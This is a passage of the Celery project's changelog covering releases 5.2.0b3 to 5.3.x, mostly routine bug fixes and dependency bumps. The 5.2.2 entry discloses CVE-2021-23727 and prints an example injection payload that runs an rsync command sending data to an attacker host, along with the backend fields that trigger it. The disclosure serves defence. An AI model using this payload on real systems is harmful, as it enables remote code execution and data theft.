  - python-memcached==1.61 -\> python-memcached\>=1.61 (\#8787)
  - Remove usage of utcnow (\#8791)
  - Smoke Tests (\#8793)
  - Moved smoke tests to their own workflow (\#8797)
  - Bugfix: Worker not consuming tasks after Redis broker restart (\#8796)
  - Bugfix: Missing id on chain (\#8798)

## 5.3.6

  - release-date  
    2023-11-22 9:15 P.M GMT+6

  - release-by  
    Asif Saif Uddin

This release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. The code changes are mostly fix for regressions. More details can be found below.

  - Increased docker-build CI job timeout from 30m -\> 60m (\#8635)
  - Incredibly minor spelling fix. (\#8649)
  - Fix non-zero exit code when receiving remote shutdown (\#8650)
  - Update task.py get\_custom\_headers missing 'compression' key (\#8633)
  - Update kombu\>=5.3.4 to fix SQS request compatibility with boto JSON serializer (\#8646)
  - test requirements version update (\#8655)
  - Update elasticsearch version (\#8656)
  - Propagates more ImportErrors during autodiscovery (\#8632)

## 5.3.5

  - release-date  
    2023-11-10 7:15 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Update test.txt versions (\#8481)
  - fix os.getcwd() FileNotFoundError (\#8448)
  - Fix typo in CONTRIBUTING.rst (\#8494)
  - typo(doc): configuration.rst (\#8484)
  - assert before raise (\#8495)
  - Update GHA checkout version (\#8496)
  - Fixed replaced\_task\_nesting (\#8500)
  - Fix code indentation for route\_task() example (\#8502)
  - support redis 5.x (\#8504)
  - Fix typos in test\_canvas.py (\#8498)
  - Marked flaky tests (\#8508)
  - Fix typos in calling.rst (\#8506)
  - Added support for replaced\_task\_nesting in chains (\#8501)
  - Fix typos in canvas.rst (\#8509)
  - Patch Version Release Checklist (\#8488)
  - Added Python 3.11 support to Dockerfile (\#8511)
  - Dependabot (Celery) (\#8510)
  - Bump actions/checkout from 3 to 4 (\#8512)
  - Update ETA example to include timezone (\#8516)
  - Replaces datetime.fromisoformat with the more lenient dateutil parser (\#8507)
  - Fixed indentation in Dockerfile for Python 3.11 (\#8527)
  - Fix git bug in Dockerfile (\#8528)
  - Tox lint upgrade from Python 3.9 to Python 3.11 (\#8526)
  - Document gevent concurrency (\#8520)
  - Update test.txt (\#8530)
  - Celery Docker Upgrades (\#8531)
  - pyupgrade upgrade v3.11.0 -\> v3.13.0 (\#8535)
  - Update msgpack.txt (\#8548)
  - Update auth.txt (\#8547)
  - Update msgpack.txt to fix build issues (\#8552)
  - Basic ElasticSearch / ElasticClient 8.x Support (\#8519)
  - Fix eager tasks does not populate name field (\#8486)
  - Fix typo in celery.app.control (\#8563)
  - Update solar.txt ephem (\#8566)
  - Update test.txt pytest-timeout (\#8565)
  - Correct some mypy errors (\#8570)
  - Update elasticsearch.txt (\#8573)
  - Update test.txt deps (\#8574)
  - Update test.txt (\#8590)
  - Improved the "Next steps" documentation (\#8561). (\#8600)
  - Disabled couchbase tests due to broken package breaking main (\#8602)
  - Update elasticsearch deps (\#8605)
  - Update cryptography==41.0.5 (\#8604)
  - Update pytest==7.4.3 (\#8606)
  - test initial support of python 3.12.x (\#8549)
  - updated new versions to fix CI (\#8607)
  - Update zstd.txt (\#8609)
  - Fixed CI Support with Python 3.12 (\#8611)
  - updated CI, docs and classifier for next release (\#8613)
  - updated dockerfile to add python 3.12 (\#8614)
  - lint,mypy,docker-unit-tests -\> Python 3.12 (\#8617)
  - Correct type of <span class="title-ref">request</span> in <span class="title-ref">task\_revoked</span> documentation (\#8616)
  - update docs docker image (\#8618)
  - Fixed RecursionError caused by giving <span class="title-ref">config\_from\_object</span> nested mod… (\#8619)
  - Fix: serialization error when gossip working (\#6566)
  - \[documentation\] broker\_connection\_max\_retries of 0 does not mean "retry forever" (\#8626)
  - added 2 debian package for better stability in Docker (\#8629)

## 5.3.4

  - release-date  
    2023-09-03 10:10 P.M GMT+2

  - release-by  
    Tomer Nosrati

<div class="warning">

<div class="title">

Warning

</div>

This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:

  - Revert "store children with database backend" (\#8475)
  - Revert "Fix eager tasks does not populate name field" (\#8476)

</div>

  - Bugfix: Removed unecessary stamping code from \_chord.run() (\#8339)
  - User guide fix (hotfix for \#1755) (\#8342)
  - store children with database backend (\#8338)
  - Stamping bugfix with group/chord header errback linking (\#8347)
  - Use argsrepr and kwargsrepr in LOG\_RECEIVED (\#8301)
  - Fixing minor typo in code example in calling.rst (\#8366)
  - add documents for timeout settings (\#8373)
  - fix: copyright year (\#8380)
  - setup.py: enable include\_package\_data (\#8379)
  - Fix eager tasks does not populate name field (\#8383)
  - Update test.txt dependencies (\#8389)
  - Update auth.txt deps (\#8392)
  - Fix backend.get\_task\_meta ignores the result\_extended config parameter in mongodb backend (\#8391)
  - Support preload options for shell and purge commands (\#8374)
  - Implement safer ArangoDB queries (\#8351)
  - integration test: cleanup worker after test case (\#8361)
  - Added "Tomer Nosrati" to CONTRIBUTORS.txt (\#8400)
  - Update README.rst (\#8404)
  - Update README.rst (\#8408)
  - fix(canvas): add group index when unrolling tasks (\#8427)
  - fix(beat): debug statement should only log AsyncResult.id if it exists (\#8428)
  - Lint fixes & pre-commit autoupdate (\#8414)
  - Update auth.txt (\#8435)
  - Update mypy on test.txt (\#8438)
  - added missing kwargs arguments in some cli cmd (\#8049)
  - Fix \#8431: Set format\_date to False when calling \_get\_result\_meta on mongo backend (\#8432)
  - Docs: rewrite out-of-date code (\#8441)
  - Limit redis client to 4.x since 5.x fails the test suite (\#8442)
  - Limit tox to \< 4.9 (\#8443)
  - Fixed issue: Flags broker\_connection\_retry\_on\_startup & broker\_connection\_retry aren’t reliable (\#8446)
  - doc update from \#7651 (\#8451)
  - Remove tox version limit (\#8464)
  - Fixed AttributeError: 'str' object has no attribute (\#8463)
  - Upgraded Kombu from 5.3.1 -\> 5.3.2 (\#8468)
  - Document need for [CELERY]() prefix on CLI env vars (\#8469)
  - Use string value for CELERY\_SKIP\_CHECKS envvar (\#8462)
  - Revert "store children with database backend" (\#8475)
  - Revert "Fix eager tasks does not populate name field" (\#8476)
  - Update Changelog (\#8474)
  - Remove as it seems to be buggy. (\#8340)
  - Revert "Add Semgrep to CI" (\#8477)
  - Revert "Revert "Add Semgrep to CI"" (\#8478)

## 5.3.3 (Yanked)

  - release-date  
    2023-08-31 1:47 P.M GMT+2

  - release-by  
    Tomer Nosrati

<div class="warning">

<div class="title">

Warning

</div>

This version has been yanked due to breaking API changes. The breaking changes include:

  - Store children with database backend (\#8338)
  - Fix eager tasks does not populate name field (\#8383)

</div>

  - Fixed changelog for 5.3.2 release docs.

## 5.3.2 (Yanked)

  - release-date  
    2023-08-31 1:30 P.M GMT+2

  - release-by  
    Tomer Nosrati

<div class="warning">

<div class="title">

Warning

</div>

This version has been yanked due to breaking API changes. The breaking changes include:

  - Store children with database backend (\#8338)
  - Fix eager tasks does not populate name field (\#8383)

</div>

  - Bugfix: Removed unecessary stamping code from \_chord.run() (\#8339)
  - User guide fix (hotfix for \#1755) (\#8342)
  - Store children with database backend (\#8338)
  - Stamping bugfix with group/chord header errback linking (\#8347)
  - Use argsrepr and kwargsrepr in LOG\_RECEIVED (\#8301)
  - Fixing minor typo in code example in calling.rst (\#8366)
  - Add documents for timeout settings (\#8373)
  - Fix: copyright year (\#8380)
  - Setup.py: enable include\_package\_data (\#8379)
  - Fix eager tasks does not populate name field (\#8383)
  - Update test.txt dependencies (\#8389)
  - Update auth.txt deps (\#8392)
  - Fix backend.get\_task\_meta ignores the result\_extended config parameter in mongodb backend (\#8391)
  - Support preload options for shell and purge commands (\#8374)
  - Implement safer ArangoDB queries (\#8351)
  - Integration test: cleanup worker after test case (\#8361)
  - Added "Tomer Nosrati" to CONTRIBUTORS.txt (\#8400)
  - Update README.rst (\#8404)
  - Update README.rst (\#8408)
  - Fix(canvas): add group index when unrolling tasks (\#8427)
  - Fix(beat): debug statement should only log AsyncResult.id if it exists (\#8428)
  - Lint fixes & pre-commit autoupdate (\#8414)
  - Update auth.txt (\#8435)
  - Update mypy on test.txt (\#8438)
  - Added missing kwargs arguments in some cli cmd (\#8049)
  - Fix \#8431: Set format\_date to False when calling \_get\_result\_meta on mongo backend (\#8432)
  - Docs: rewrite out-of-date code (\#8441)
  - Limit redis client to 4.x since 5.x fails the test suite (\#8442)
  - Limit tox to \< 4.9 (\#8443)
  - Fixed issue: Flags broker\_connection\_retry\_on\_startup & broker\_connection\_retry aren’t reliable (\#8446)
  - Doc update from \#7651 (\#8451)
  - Remove tox version limit (\#8464)
  - Fixed AttributeError: 'str' object has no attribute (\#8463)
  - Upgraded Kombu from 5.3.1 -\> 5.3.2 (\#8468)

## 5.3.1

  - release-date  
    2023-06-18 8:15 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Upgrade to latest pycurl release (\#7069).
  - Limit librabbitmq\>=2.0.0; python\_version \< '3.11' (\#8302).
  - Added initial support for python 3.11 (\#8304).
  - ChainMap observers fix (\#8305).
  - Revert optimization CLI flag behaviour back to original.
  - Restrict redis 4.5.5 as it has severe bugs (\#8317).
  - Tested pypy 3.10 version in CI (\#8320).
  - Bump new version of kombu to 5.3.1 (\#8323).
  - Fixed a small float value of retry\_backoff (\#8295).
  - Limit pyro4 up to python 3.10 only as it is (\#8324).

## 5.3.0

  - release-date  
    2023-06-06 12:00 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Test kombu 5.3.0 & minor doc update (\#8294).
  - Update librabbitmq.txt \> 2.0.0 (\#8292).
  - Upgrade syntax to py3.8 (\#8281).

## 5.3.0rc2

  - release-date  
    2023-05-31 9:00 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Add missing dependency.
  - Fix exc\_type being the exception instance rather.
  - Fixed revoking tasks by stamped headers (\#8269).
  - Support sqlalchemy 2.0 in tests (\#8271).
  - Fix docker (\#8275).
  - Update redis.txt to 4.5 (\#8278).
  - Update kombu\>=5.3.0rc2.

## 5.3.0rc1

  - release-date  
    2023-05-11 4:24 P.M GMT+2

  - release-by  
    Tomer Nosrati

<!-- end list -->

  - fix functiom name by @cuishuang in \#8087
  - Update CELERY\_TASK\_EAGER setting in user guide by @thebalaa in \#8085
  - Stamping documentation fixes & cleanups by @Nusnus in \#8092
  - switch to maintained pyro5 by @auvipy in \#8093
  - udate dependencies of tests by @auvipy in \#8095
  - cryptography==39.0.1 by @auvipy in \#8096
  - Annotate celery/security/certificate.py by @Kludex in \#7398
  - Deprecate parse\_iso8601 in favor of fromisoformat by @stumpylog in \#8098
  - pytest==7.2.2 by @auvipy in \#8106
  - Type annotations for celery/utils/text.py by @max-muoto in \#8107
  - Update web framework URLs by @sblondon in \#8112
  - Fix contribution URL by @sblondon in \#8111
  - Trying to clarify CERT\_REQUIRED by @pamelafox in \#8113
  - Fix potential AttributeError on 'stamps' by @Darkheir in \#8115
  - Type annotations for celery/apps/beat.py by @max-muoto in \#8108
  - Fixed bug where retrying a task loses its stamps by @Nusnus in \#8120
  - Type hints for celery/schedules.py by @max-muoto in \#8114
  - Reference Gopher Celery in README by @marselester in \#8131
  - Update sqlalchemy.txt by @auvipy in \#8136
  - azure-storage-blob 12.15.0 by @auvipy in \#8137
  - test kombu 5.3.0b3 by @auvipy in \#8138
  - fix: add expire string parse. by @Bidaya0 in \#8134
  - Fix worker crash on un-pickleable exceptions by @youtux in \#8133
  - CLI help output: avoid text rewrapping by click by @woutdenolf in \#8152
  - Warn when an unnamed periodic task override another one. by @iurisilvio in \#8143
  - Fix Task.handle\_ignore not wrapping exceptions properly by @youtux in \#8149
  - Hotfix for (\#8120) - Stamping bug with retry by @Nusnus in \#8158
  - Fix integration test by @youtux in \#8156
  - Fixed bug in revoke\_by\_stamped\_headers where impl did not match doc by @Nusnus in \#8162
  - Align revoke and revoke\_by\_stamped\_headers return values (terminate=True) by @Nusnus in \#8163
  - Update & simplify GHA pip caching by @stumpylog in \#8164
  - Update auth.txt by @auvipy in \#8167
  - Update test.txt versions by @auvipy in \#8173
  - remove extra = from test.txt by @auvipy in \#8179
  - Update sqs.txt kombu\[sqs\]\>=5.3.0b3 by @auvipy in \#8174
  - Added signal triggered before fork by @jaroslawporada in \#8177
  - Update documentation on SQLAlchemy by @max-muoto in \#8188
  - Deprecate pytz and use zoneinfo by @max-muoto in \#8159
  - Update dev.txt by @auvipy in \#8192
  - Update test.txt by @auvipy in \#8193
  - Update test-integration.txt by @auvipy in \#8194
  - Update zstd.txt by @auvipy in \#8195
  - Update s3.txt by @auvipy in \#8196
  - Update msgpack.txt by @auvipy in \#8199
  - Update solar.txt by @auvipy in \#8198
  - Add Semgrep to CI by @Nusnus in \#8201
  - Added semgrep to README.rst by @Nusnus in \#8202
  - Update django.txt by @auvipy in \#8197
  - Update redis.txt 4.3.6 by @auvipy in \#8161
  - start removing codecov from pypi by @auvipy in \#8206
  - Update test.txt dependencies by @auvipy in \#8205
  - Improved doc for: worker\_deduplicate\_successful\_tasks by @Nusnus in \#8209
  - Renamed revoked\_headers to revoked\_stamps by @Nusnus in \#8210
  - Ensure argument for map is JSON serializable by @candleindark in \#8229

## 5.3.0b2

  - release-date  
    2023-02-19 1:47 P.M GMT+2

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - BLM-2: Adding unit tests to chord clone by @Nusnus in \#7668
  - Fix unknown task error typo by @dcecile in \#7675
  - rename redis integration test class so that tests are executed by @wochinge in \#7684
  - Check certificate/private key type when loading them by @qrmt in \#7680
  - Added integration test\_chord\_header\_id\_duplicated\_on\_rabbitmq\_msg\_duplication() by @Nusnus in \#7692
  - New feature flag: allow\_error\_cb\_on\_chord\_header - allowing setting an error callback on chord header by @Nusnus in \#7712
  - Update README.rst sorting Python/Celery versions by @andrebr in \#7714
  - Fixed a bug where stamping a chord body would not use the correct stamping method by @Nusnus in \#7722
  - Fixed doc duplication typo for Signature.stamp() by @Nusnus in \#7725
  - Fix issue 7726: variable used in finally block may not be instantiated by @woutdenolf in \#7727
  - Fixed bug in chord stamping with another chord as a body + unit test by @Nusnus in \#7730
  - Use "describe\_table" not "create\_table" to check for existence of DynamoDB table by @maxfirman in \#7734
  - Enhancements for task\_allow\_error\_cb\_on\_chord\_header tests and docs by @Nusnus in \#7744
  - Improved custom stamping visitor documentation by @Nusnus in \#7745
  - Improved the coverage of test\_chord\_stamping\_body\_chord() by @Nusnus in \#7748
  - billiard \>= 3.6.3.0,\<5.0 for rpm by @auvipy in \#7764
  - Fixed memory leak with ETA tasks at connection error when worker\_cancel\_long\_running\_tasks\_on\_connection\_loss is enabled by @Nusnus in \#7771
  - Fixed bug where a chord with header of type tuple was not supported in the link\_error flow for task\_allow\_error\_cb\_on\_chord\_header flag by @Nusnus in \#7772
  - Scheduled weekly dependency update for week 38 by @pyup-bot in \#7767
  - recreate\_module: set spec to the new module by @skshetry in \#7773
  - Override integration test config using integration-tests-config.json by @thedrow in \#7778
  - Fixed error handling bugs due to upgrade to a newer version of billiard by @Nusnus in \#7781
  - Do not recommend using easy\_install anymore by @jugmac00 in \#7789
  - GitHub Workflows security hardening by @sashashura in \#7768
  - Update ambiguous acks\_late doc by @Zhong-z in \#7728
  - billiard \>=4.0.2,\<5.0 by @auvipy in \#7720
  - importlib\_metadata remove deprecated entry point interfaces by @woutdenolf in \#7785
  - Scheduled weekly dependency update for week 41 by @pyup-bot in \#7798
  - pyzmq\>=22.3.0 by @auvipy in \#7497
  - Remove amqp from the BACKEND\_ALISES list by @Kludex in \#7805
  - Replace print by logger.debug by @Kludex in \#7809
  - Ignore coverage on except ImportError by @Kludex in \#7812
  - Add mongodb dependencies to test.txt by @Kludex in \#7810
  - Fix grammar typos on the whole project by @Kludex in \#7815
  - Remove isatty wrapper function by @Kludex in \#7814
  - Remove unused variable \_range by @Kludex in \#7813
  - Add type annotation on concurrency/threads.py by @Kludex in \#7808
  - Fix linter workflow by @Kludex in \#7816
  - Scheduled weekly dependency update for week 42 by @pyup-bot in \#7821
  - Remove .cookiecutterrc by @Kludex in \#7830
  - Remove .coveragerc file by @Kludex in \#7826
  - kombu\>=5.3.0b2 by @auvipy in \#7834
  - Fix readthedocs build failure by @woutdenolf in \#7835
  - Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by @Nusnus in \#7825
  - Stabilized test\_mutable\_errback\_called\_by\_chord\_from\_group\_fail\_multiple by @Nusnus in \#7837
  - Use SPDX license expression in project metadata by @RazerM in \#7845
  - New control command revoke\_by\_stamped\_headers by @Nusnus in \#7838
  - Clarify wording in Redis priority docs by @strugee in \#7853
  - Fix non working example of using celery\_worker pytest fixture by @paradox-lab in \#7857
  - Removed the mandatory requirement to include stamped\_headers key when implementing on\_signature() by @Nusnus in \#7856
  - Update serializer docs by @sondrelg in \#7858
  - Remove reference to old Python version by @Kludex in \#7829
  - Added on\_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by @Nusnus in \#7860
  - Add clarifying information to completed\_count documentation by @hankehly in \#7873
  - Stabilized test\_revoked\_by\_headers\_complex\_canvas by @Nusnus in \#7877
  - StampingVisitor will visit the callbacks and errbacks of the signature by @Nusnus in \#7867
  - Fix "rm: no operand" error in clean-pyc script by @hankehly in \#7878
  - Add --skip-checks flag to bypass django core checks by @mudetz in \#7859
  - Scheduled weekly dependency update for week 44 by @pyup-bot in \#7868
  - Added two new unit tests to callback stamping by @Nusnus in \#7882
  - Sphinx extension: use inspect.signature to make it Python 3.11 compatible by @mathiasertl in \#7879
  - cryptography==38.0.3 by @auvipy in \#7886
  - Canvas.py doc enhancement by @Nusnus in \#7889
  - Fix typo by @sondrelg in \#7890
  - fix typos in optional tests by @hsk17 in \#7876
  - Canvas.py doc enhancement by @Nusnus in \#7891
  - Fix revoke by headers tests stability by @Nusnus in \#7892
  - feat: add global keyprefix for backend result keys by @kaustavb12 in \#7620
  - Canvas.py doc enhancement by @Nusnus in \#7897
  - fix(sec): upgrade sqlalchemy to 1.2.18 by @chncaption in \#7899
  - Canvas.py doc enhancement by @Nusnus in \#7902
  - Fix test warnings by @ShaheedHaque in \#7906
  - Support for out-of-tree worker pool implementations by @ShaheedHaque in \#7880
  - Canvas.py doc enhancement by @Nusnus in \#7907
  - Use bound task in base task example. Closes \#7909 by @WilliamDEdwards in \#7910
  - Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by @Nusnus in \#7914
  - Stamping a task left the task properties dirty by @Nusnus in \#7916
  - Fixed bug when chaining a chord with a group by @Nusnus in \#7919
  - Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by @Nusnus in \#7928
  - Fixed bug in task\_accepted() where the request was not added to the requests but only to the active\_requests by @Nusnus in \#7929
  - Fix bug in TraceInfo.\_log\_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by @Nusnus in \#7930
  - Added integration test: test\_all\_tasks\_of\_canvas\_are\_stamped() by @Nusnus in \#7931
  - Added new example for the stamping mechanism: examples/stamping by @Nusnus in \#7933
  - Fixed a bug where replacing a stamped task and stamping it again by @Nusnus in \#7934
  - Bugfix for nested group stamping on task replace by @Nusnus in \#7935
  - Added integration test test\_stamping\_example\_canvas() by @Nusnus in \#7937
  - Fixed a bug in losing chain links when unchaining an inner chain with links by @Nusnus in \#7938
  - Removing as not mandatory by @auvipy in \#7885
  - Housekeeping for Canvas.py by @Nusnus in \#7942
  - Scheduled weekly dependency update for week 50 by @pyup-bot in \#7954
  - try pypy 3.9 in CI by @auvipy in \#7956
  - sqlalchemy==1.4.45 by @auvipy in \#7943
  - billiard\>=4.1.0,\<5.0 by @auvipy in \#7957
  - feat(typecheck): allow changing type check behavior on the app level; by @moaddib666 in \#7952
  - Add broker\_channel\_error\_retry option by @nkns165 in \#7951
  - Add beat\_cron\_starting\_deadline\_seconds to prevent unwanted cron runs by @abs25 in \#7945
  - Scheduled weekly dependency update for week 51 by @pyup-bot in \#7965
  - Added doc to "retry\_errors" newly supported field of "publish\_retry\_policy" of the task namespace by @Nusnus in \#7967
  - Renamed from master to main in the docs and the CI workflows by @Nusnus in \#7968
  - Fix docs for the exchange to use with worker\_direct by @alessio-b2c2 in \#7973
  - Pin redis==4.3.4 by @auvipy in \#7974
  - return list of nodes to make sphinx extension compatible with Sphinx 6.0 by @mathiasertl in \#7978
  - use version range redis\>=4.2.2,\<4.4.0 by @auvipy in \#7980
  - Scheduled weekly dependency update for week 01 by @pyup-bot in \#7987
  - Add annotations to minimise differences with celery-aio-pool's tracer.py. by @ShaheedHaque in \#7925
  - Fixed bug where linking a stamped task did not add the stamp to the link's options by @Nusnus in \#7992
  - sqlalchemy==1.4.46 by @auvipy in \#7995
  - pytz by @auvipy in \#8002
  - Fix few typos, provide configuration + workflow for codespell to catch any new by @yarikoptic in \#8023
  - RabbitMQ links update by @arnisjuraga in \#8031
  - Ignore files generated by tests by @Kludex in \#7846
  - Revert "sqlalchemy==1.4.46 (\#7995)" by @Nusnus in \#8033
  - Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by @Nusnus in \#8034
  - Fixed formatting in setup.cfg that caused flake8 to misbehave by @Nusnus in \#8044
  - Removed duplicated import Iterable by @Nusnus in \#8046
  - Fix docs by @Nusnus in \#8047
  - Document --logfile default by @strugee in \#8057
  - Stamping Mechanism Refactoring by @Nusnus in \#8045
  - result\_backend\_thread\_safe config shares backend across threads by @CharlieTruong in \#8058
  - Fix cronjob that use day of month and negative UTC timezone by @pkyosx in \#8053
  - Stamping Mechanism Examples Refactoring by @Nusnus in \#8060
  - Fixed bug in Task.on\_stamp\_replaced() by @Nusnus in \#8061
  - Stamping Mechanism Refactoring 2 by @Nusnus in \#8064
  - Changed default append\_stamps from True to False (meaning duplicates … by @Nusnus in \#8068
  - typo in comment: mailicious =\> malicious by @yanick in \#8072
  - Fix command for starting flower with specified broker URL by @ShukantPal in \#8071
  - Improve documentation on ETA/countdown tasks (\#8069) by @norbertcyran in \#8075

## 5.3.0b1

  - release-date  
    2022-08-01 5:15 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Canvas Header Stamping (\#7384).
  - async chords should pass it's kwargs to the group/body.
  - beat: Suppress banner output with the quiet option (\#7608).
  - Fix honor Django's TIME\_ZONE setting.
  - Don't warn about DEBUG=True for Django.
  - Fixed the on\_after\_finalize cannot access tasks due to deadlock.
  - Bump kombu\>=5.3.0b1,\<6.0.
  - Make default worker state limits configurable (\#7609).
  - Only clear the cache if there are no active writers.
  - Billiard 4.0.1

## 5.3.0a1

  - release-date  
    2022-06-29 5:15 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Remove Python 3.4 compatibility code.
  - call ping to set connection attr for avoiding redis parse\_response error.
  - Use importlib instead of deprecated pkg\_resources.
  - fix \#7245 uid duplicated in command params.
  - Fix subscribed\_to maybe empty (\#7232).
  - Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) \#7290.
  - Add security\_key\_password option (\#7292).
  - Limit elasticsearch support to below version 8.0.
  - try new major release of pytest 7 (\#7330).
  - broker\_connection\_retry should no longer apply on startup (\#7300).
  - Remove \_\_ne\_\_ methods (\#7257).
  - fix \#7200 uid and gid.
  - Remove exception-throwing from the signal handler.
  - Add mypy to the pipeline (\#7383).
  - Expose more debugging information when receiving unknown tasks. (\#7405)
  - Avoid importing buf\_t from billiard's compat module as it was removed.
  - Avoid negating a constant in a loop. (\#7443)
  - Ensure expiration is of float type when migrating tasks (\#7385).
  - load\_extension\_class\_names - correct module\_name (\#7406)
  - Bump pymongo\[srv\]\>=4.0.2.
  - Use inspect.getgeneratorstate in asynpool.gen\_not\_started (\#7476).
  - Fix test with missing .get() (\#7479).
  - azure-storage-blob\>=12.11.0
  - Make start\_worker, setup\_default\_app reusable outside of pytest.
  - Ensure a proper error message is raised when id for key is empty (\#7447).
  - Crontab string representation does not match UNIX crontab expression.
  - Worker should exit with ctx.exit to get the right exitcode for non-zero.
  - Fix expiration check (\#7552).
  - Use callable built-in.
  - Include dont\_autoretry\_for option in tasks. (\#7556)
  - fix: Syntax error in arango query.
  - Fix custom headers propagation on task retries (\#7555).
  - Silence backend warning when eager results are stored.
  - Reduce prefetch count on restart and gradually restore it (\#7350).
  - Improve workflow primitive subclassing (\#7593).
  - test kombu\>=5.3.0a1,\<6.0 (\#7598).
  - Canvas Header Stamping (\#7384).

## 5.2.7

  - release-date  
    2022-5-26 12:15 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (\#7534).

## 5.2.6

  - release-date  
    2022-4-04 21:15 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  -   - load\_extension\_class\_names - correct module\_name (\#7433).  
        This fixes a regression caused by \#7218.

## 5.2.5

  - release-date  
    2022-4-03 20:42 P.M UTC+2:00

  - release-by  
    Omer Katz

**This release was yanked due to a regression caused by the PR below**

  - Use importlib instead of deprecated pkg\_resources (\#7218).

## 5.2.4

  - release-date  
    2022-4-03 20:30 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Expose more debugging information when receiving unknown tasks (\#7404).

## 5.2.3

  - release-date  
    2021-12-29 12:00 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Allow redis \>= 4.0.2.
  - Upgrade minimum required pymongo version to 3.11.1.
  - tested pypy3.8 beta (\#6998).
  - Split Signature.\_\_or\_\_ into subclasses' \_\_or\_\_ (\#7135).
  - Prevent duplication in event loop on Consumer restart.
  - Restrict setuptools\>=59.1.1,\<59.7.0.
  - Kombu bumped to v5.2.3
  - py-amqp bumped to v5.0.9
  - Some docs & CI improvements.

## 5.2.2

  - release-date  
    2021-12-26 16:30 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Various documentation fixes.

  - Fix CVE-2021-23727 (Stored Command Injection security vulnerability).
    
    > When a task fails, the failure information is serialized in the backend. In some cases, the exception class is only importable from the consumer's code base. In this case, we reconstruct the exception class so that we can re-raise the error on the process which queried the task's result. This was introduced in \#4836. If the recreated exception type isn't an exception, this is a security issue. Without the condition included in this patch, an attacker could inject a remote code execution instruction such as: `os.system("rsync /data attacker@192.168.56.100:~/data")` by setting the task's result to a failure in the result backend with the os, the system function as the exception type and the payload `rsync /data attacker@192.168.56.100:~/data` as the exception arguments like so:
    > 
    >   - \`\`\`python
    >     
    >       - {  
    >         "exc\_module": "os", 'exc\_type': "system", "exc\_message": "rsync /data <attacker@192.168.56.100>:\~/data"
    >     
    >     }
    > 
    > According to my analysis, this vulnerability can only be exploited if the producer delayed a task which runs long enough for the attacker to change the result mid-flight, and the producer has polled for the task's result. The attacker would also have to gain access to the result backend. The severity of this security vulnerability is low, but we still recommend upgrading.

<div id="version-5.2.1">

5.2.1 \`\`\` =====

</div>

  - release-date  
    2021-11-16 8.55 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Fix rstrip usage on bytes instance in ProxyLogger.
  - Pass logfile to ExecStop in celery.service example systemd file.
  - fix: reduce latency of AsyncResult.get under gevent (\#7052)
  - Limit redis version: \<4.0.0.
  - Bump min kombu version to 5.2.2.
  - Change pytz\>dev to a PEP 440 compliant pytz\>0.dev.0.
  - Remove dependency to case (\#7077).
  - fix: task expiration is timezone aware if needed (\#7065).
  - Initial testing of pypy-3.8 beta to CI.
  - Docs, CI & tests cleanups.

## 5.2.0

  - release-date  
    2021-11-08 7.15 A.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Prevent from subscribing to empty channels (\#7040)
  - fix register\_task method.
  - Fire task failure signal on final reject (\#6980)
  - Limit pymongo version: \<3.12.1 (\#7041)
  - Bump min kombu version to 5.2.1

## 5.2.0rc2

  - release-date  
    2021-11-02 1.54 P.M UTC+3:00

  - release-by  
    Naomi Elstein

<!-- end list -->

  - Bump Python 3.10.0 to rc2.
  - \[pre-commit.ci\] pre-commit autoupdate (\#6972).
  - autopep8.
  - Prevent worker to send expired revoked items upon hello command (\#6975).
  - docs: clarify the 'keeping results' section (\#6979).
  - Update deprecated task module removal in 5.0 documentation (\#6981).
  - \[pre-commit.ci\] pre-commit autoupdate.
  - try python 3.10 GA.
  - mention python 3.10 on readme.
  - Documenting the default consumer\_timeout value for rabbitmq \>= 3.8.15.
  - Azure blockblob backend parametrized connection/read timeouts (\#6978).
  - Add as\_uri method to azure block blob backend.
  - Add possibility to override backend implementation with celeryconfig (\#6879).
  - \[pre-commit.ci\] pre-commit autoupdate.
  - try to fix deprecation warning.
  - \[pre-commit.ci\] pre-commit autoupdate.
  - not needed anyore.
  - not needed anyore.
  - not used anymore.
  - add github discussions forum

## 5.2.0rc1

  - release-date  
    2021-09-26 4.04 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Kill all workers when main process exits in prefork model (\#6942).
  - test kombu 5.2.0rc1 (\#6947).
  - try moto 2.2.x (\#6948).
  - Prepared Hacker News Post on Release Action.
  - update setup with python 3.7 as minimum.
  - update kombu on setupcfg.
  - Added note about automatic killing all child processes of worker after its termination.
  - \[pre-commit.ci\] pre-commit autoupdate.
  - Move importskip before greenlet import (\#6956).
  - amqp: send expiration field to broker if requested by user (\#6957).
  - Single line drift warning.
  - canvas: fix kwargs argument to prevent recursion (\#6810) (\#6959).
  - Allow to enable Events with app.conf mechanism.
  - Warn when expiration date is in the past.
  - Add the Framework :: Celery trove classifier.
  - Give indication whether the task is replacing another (\#6916).
  - Make setup.py executable.
  - Bump version: 5.2.0b3 → 5.2.0rc1.

## 5.2.0b3

  - release-date  
    2021-09-02 8.38 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Add args to LOG\_RECEIVED (fixes \#6885) (\#6898).
